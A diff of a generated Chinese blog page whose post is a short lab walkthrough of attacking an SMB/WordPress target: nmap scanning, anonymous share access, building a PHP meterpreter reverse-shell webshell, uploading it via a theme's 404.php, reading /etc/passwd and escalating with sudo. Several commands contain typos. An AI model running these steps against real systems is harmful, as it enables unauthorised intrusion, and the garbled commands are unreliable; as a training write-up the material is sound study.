     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
@@ -1667,7 +1666,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
+                <a class="post-title-link" href="2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
         
 
         <div class="post-meta">
@@ -1702,7 +1701,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
+                  <a href="categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -1741,14 +1740,14 @@
       
         
           
-            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV ip  探测服务信息</span><br><span class="line"></span><br><span class="line">namp -A -v -T4 ip  靶场全部信息,最大线程</span><br></pre></td></tr></table></figure>
+            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV<span class="built_in"> ip </span> 探测服务信息</span><br><span class="line"></span><br><span class="line">namp -A -v -T4<span class="built_in"> ip </span> 靶场全部信息,最大线程</span><br></pre></td></tr></table></figure>
 <h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><h4 id="smb-弱点"><a href="#smb-弱点" class="headerlink" title="smb 弱点"></a>smb 弱点</h4><ol>
 <li>空口令登录</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip</span><br><span class="line"></span><br><span class="line"> smbclient &apos;\\ip\print$&apos;</span><br><span class="line"></span><br><span class="line">smbclient &apos;\\ip\share$&apos;</span><br><span class="line"></span><br><span class="line"> get 敏感文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip</span><br><span class="line"></span><br><span class="line"> smbclient '<span class="symbol">\\</span>ip<span class="symbol">\p</span>rint$'</span><br><span class="line"></span><br><span class="line">smbclient '<span class="symbol">\\</span>ip<span class="symbol">\s</span>hare$'</span><br><span class="line"></span><br><span class="line"> get 敏感文件</span><br></pre></td></tr></table></figure>
 <ol start="2">
 <li><p>远程溢出漏洞分析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit asmba  查看版本号</span><br></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> asmba  查看版本号</span><br></pre></td></tr></table></figure>
 <p>针对http协议</p>
 <ol>
 <li>浏览器查看网站</li>
@@ -1757,15 +1756,15 @@
 </ol>
 </li>
 </ol>
-<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfcvenom -p php/meterpreter/reverse_tcp lhost=攻击ip lhost=4444 -f raw &gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
+<h3 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfcvenom -p php/meterpreter/reverse_tcp <span class="attribute">lhost</span>=攻击ip <span class="attribute">lhost</span>=4444 -f<span class="built_in"> raw </span>&gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
 <h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
 <h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>找到敏感点</p>
 <p>wordpress 上传点 theme 404.php</p>
 <p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
-<h3 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
-<p>查找用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<h3 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p>查找用户名<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></p>
 <p>在共享资源查找敏感文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su 用户名</span><br><span class="line">sudo -l </span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> 用户名</span><br><span class="line">sudo -<span class="keyword">l</span> </span><br><span class="line">sudo <span class="keyword">su</span></span><br></pre></td></tr></table></figure>
 
           
         
@@ -1805,7 +1804,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="extend next" rel="next" href="page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1865,7 +1864,7 @@
               
               
               <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
+                <a href="categories/index.html">
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
@@ -1876,7 +1875,7 @@
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
+                <a href="tags/index.html">
                   <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
@@ -2027,60 +2026,60 @@
 
   
   
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+    <script type="text/javascript" src="lib/jquery/index.js?v=2.1.3"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+    <script type="text/javascript" src="lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+    <script type="text/javascript" src="lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+    <script type="text/javascript" src="lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+  <script type="text/javascript" src="js/src/utils.js?v=5.1.4"></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+  <script type="text/javascript" src="js/src/motion.js?v=5.1.4"></script>
 
 
 
   
+  
+
+
+  <script type="text/javascript" src="js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+  <script type="text/javascript" src="js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
